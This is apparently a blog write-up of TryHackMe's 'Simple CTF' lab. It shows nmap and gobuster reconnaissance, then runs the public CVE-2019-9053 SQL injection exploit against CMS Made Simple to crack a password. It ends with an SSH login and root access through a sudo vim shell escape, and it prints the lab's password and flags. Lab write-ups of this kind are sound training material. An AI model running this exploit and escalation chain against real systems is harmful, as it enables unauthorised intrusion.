---
title: "[CTF] Tryhackme - Simple CTF "
date: 2024-09-17 12:00:00 -500 
categories: [CTF - Tryhackme, Simple CTF]
tags: [ctf,exploit,flags,tryhackme,pentesting]
author: Christoph K
---
[TryHackMe- Simple CTF](https://tryhackme.com/r/room/easyctf)



# Questions:

- How many services are running under port 1000?
- What is running on the higher port?
- What's the CVE you're using against the application?
- To what kind of vulnerability is the application vulnerable?
- What's the password?
- Where can you login with the details obtained?
- What's the user flag?
- Is there any other user in the home directory? What's its name?
- What can you leverage to spawn a privileged shell?
- What's the root flag?



### How many services are running under port 1000?
 

 We start with our loved `nmap` scan. We use the Parameter `-p 0-1000` because the question asks for it. Also we use `-sV` to see Services and Versions.

 ```bash

 └─$ nmap -sV -p 0-1000 $ip
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-18 14:46 CST
Nmap scan report for 10.10.118.214
Host is up (0.24s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.31 seconds
```

Answer: `2`

### What is running on the higher port?

Now without Portscan:

```bash

└─$ nmap -sV $ip
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-18 14:48 CST
Nmap scan report for 10.10.118.214
Host is up (0.23s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.60 seconds
``` 

Answer: `ssh`

### What's the CVE you're using against the application?

Okay we have to optain more information. We can check `exploitdb` for the versions of `vsftpd` and `Openssh 7.2p`but lets check if we find some more things.

With `gobuster` we search for hidden directories.

```bash

┌──(admin㉿PREDATOR-01)-[~]
└─$ gobuster -w Downloads/common.txt dir -u $ip
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.118.214
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                Downloads/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/simple               (Status: 301) [Size: 315] [--> http://10.10.118.214/simple/]
Progress: 1942 / 1943 (99.95%)
===============================================================
Finished
===============================================================

```

We found `/simple ` - lets have a look.

On the bottom of the page we find:

    Copyright 2004 - 2024 - CMS Made Simple
    This site is powered by CMS Made Simple version 2.2.8

Could be that there is an exploit for `made simple`. Lets have a look in the robot.txt.
```
#
# "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $"
#
#   This file tells search engines not to index your CUPS server.
#
#   Copyright 1993-2003 by Easy Software Products.
#
#   These coded instructions, statements, and computer programs are the
#   property of Easy Software Products and are protected by Federal
#   copyright law.  Distribution and use rights are outlined in the file
#   "LICENSE.txt" which should have been included with this file.  If this
#   file is missing or damaged please contact Easy Software Products
#   at:
#
#       Attn: CUPS Licensing Information
#       Easy Software Products
#       44141 Airport View Drive, Suite 204
#       Hollywood, Maryland 20636-3111 USA
#
#       Voice: (301) 373-9600
#       EMail: cups-info@cups.org
#         WWW: http://www.cups.org
#

User-agent: *
Disallow: /


Disallow: /openemr-5_0_1_3 
#
# End of "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $".
```

Interesting is `mike` which could be username. 

We check if there is a exploit for `CMS Made Simple version 2.2.8`.


```bash
─$ searchsploit cms made simple 2.2.8
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                 |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
CMS Made Simple < 2.2.10 - SQL Injection                                                                                                                                       | php/webapps/46635.py
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
Seems it is vulnerable for `SQL Injection`! Lets check the Pythion script.

```bash
└─$ cat /usr/share/exploitdb/exploits/php/webapps/46635.py |head
#!/usr/bin/env python
# Exploit Title: Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9
# Date: 30-03-2019
# Exploit Author: Daniele Scanu @ Certimeter Group
# Vendor Homepage: https://www.cmsmadesimple.org/
# Software Link: https://www.cmsmadesimple.org/downloads/cmsms/
# Version: <= 2.2.9
# Tested on: Ubuntu 18.04 LTS
# CVE : CVE-2019-9053
```
Perfect, that looks like a good start. 

Answer: `CVE-2019-9053`


### To what kind of vulnerability is the application vulnerable?

We got that already in our previous question. 


Answer: `SQLi`

### What's the password?

We use the Python Script from exploitdb. First we copy it into our Path. I got some errors because of missing modules, so I installed them via `pip`.

In my case there was `requests` missing.

`sudo pip3 install requests`

If you start the script, it says which parameter we need:

```bash
┌──(admin㉿PREDATOR-01)-[~/termcolor-2.4.0/src]
└─$ python3 46635.py
[+] Specify an url target
[+] Example usage (no cracking password): exploit.py -u http://target-uri
[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist
[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based.
```

So lets use it.

`$ python3 46635.py -u http://$ip/simple --crack -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt`

After a few minutes we get a result:

```bash
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret

```

Perfect, we have cracked the password.

Answer: `secret`

### Where can you login with the details obtained?


Well, we have username, password and an open port 2222 with ssh. 

Answer: `ssh`

### What's the user flag?

We connect via `ssh` on port `2222`.
```
└─$ ssh mitch@10.10.118.214 -p 2222
The authenticity of host '[10.10.118.214]:2222 ([10.10.118.214]:2222)' can't be established.
ED25519 key fingerprint is SHA256:iq4f0XcnA5nnPNAufEqOpvTbO8dOJPcHGgmeABEdQ5g.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.118.214]:2222' (ED25519) to the list of known hosts.
mitch@10.10.118.214's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$ ls
user.txt
$ cat user.txt
G00d j0b, keep up!
```

Answer: `G00d j0b, keep up!`


### Is there any other user in the home directory? What's its name?

In our ssh session we navigate a bit:

```bash

$ pwd
/home/mitch
$ cd ..
$ ls
mitch  sunbath
$
```

Answer: `sunbath`

### What can you leverage to spawn a privileged shell?

With `sudo -l` we can check, what we are allowed to do with root:


```bash
$ bash -i
mitch@Machine:/home$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
mitch@Machine:/home$
```

seems like we can use `vim` to spawn a privliged shell.

Answer: `vim`

### What's the root flag?

Lets try to spawn an interactive shell:
https://gtfobins.github.io/gtfobins/vim/


`vim -c ':!/bin/sh'`


```bash
$ vim -c ':!/bin/sh'

$ sudo vim


Press ENTER or type command to continue
# pwd
/
# cd /root
# ls
root.txt
# cat root.txt
W3ll d0n3. You made it!
```


Answer: `W3ll d0n3. You made it!`


## Thoughts:
This CTF is interesting and we have to search for a CVE, which could be interesting. Unfortunately I did a lot of troubleshooting on the Python Script regarding missing Modules and Syntax errors. That is why I didnt enjoy it as much as the others so far..

What did we learn?
- using `nmap` for scan open ports and versions
- using `gobuster` for search for hidden directories
- using `searchsploit` to find a vulnerablity
- using a python script to crack the password
- using `vim` to spawn an interactive shell






